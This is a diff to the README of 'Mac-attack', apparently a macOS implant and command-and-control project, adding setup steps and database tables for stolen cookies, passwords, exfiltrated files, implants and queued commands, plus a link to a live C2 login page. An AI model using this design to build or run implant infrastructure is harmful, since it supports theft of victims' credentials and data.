@@ -1,6 +1,91 @@
 # Mac-attack 
 
-## Using the C2
+## Setting up local 
+
+### C2 
+Inside /C2 run
+```pip install -r requirements.txt```
+Then run flask run. You need to set up an .env file with the nescesary variables for the database. 
+
+### Database 
+
+```SQL
+
+CREATE TABLE public.cookies (
+    p_key serial PRIMARY KEY,
+    task_id integer NOT NULL,
+    target_implant_id integer,
+    path text,
+    hostkey text,
+    value text
+);
+
+
+
+CREATE TABLE public.files (
+    file_name character varying(25),
+    data bytea,
+    task_id integer PRIMARY KEY,
+    implant_id integer
+);
+
+
+CREATE TABLE public.implants (
+    implant_id serial PRIMARY KEY,
+    first_connection timestamp without time zone NOT NULL,
+    active boolean,
+    location character varying(950),
+    computer_name character varying(50),
+    guid integer,
+    ip_address character varying(20),
+    last_seen timestamp without time zone,
+    jitter integer,
+    next_check_in timestamp without time zone,
+    sleep integer,
+    session_key character varying(255)
+);
+
+
+
+CREATE TABLE public.passwords (
+    p_key integer PRIMARY KEY NOT NULL,
+    task_id integer NOT NULL,
+    target_implant_id integer NOT NULL,
+    path text,
+    username text,
+    password text,
+    url text
+);
+
+
+CREATE TABLE public.task_queue (
+    task_id serial PRIMARY KEY NOT NULL,
+    target_implant_id integer NOT NULL,
+    command character varying(100),
+    created_on timestamp without time zone,
+    status character varying(20),
+    response_data text,
+    success boolean,
+    recieved_on timestamp without time zone,
+    creator character varying(20)
+);
+
+
+CREATE TABLE public.users (
+    user_id serial NOT NULL PRIMARY KEY,
+    name character varying(25),
+    is_online boolean,
+    password character varying,
+    salt character varying(100)
+);
+
+```
+
+### The implant 
+See make files 
+
+
+## Using the C2 - Our production server 
 Go to the following link in order to gain access to the C2
 https://walrus-app-tj8x9.ondigitalocean.app/login
 
@@ -71,7 +156,9 @@ If web app were to be compromised, users could lose all implants at once - in ad
 Look further towards defense evasion within the implant, as well as preventing man-in-the-middle attacks.
 Stay up to date on latest safety practices for both SQL server and web application. Any new code needs to follow best practices - need to prevent SQL injection or directory traversal.
 
+## ER Diagram
 
+<img src="er_diagram.jpg" alt="ER Diagram" title="ER Diagram">
 
 
 ## Mitre 
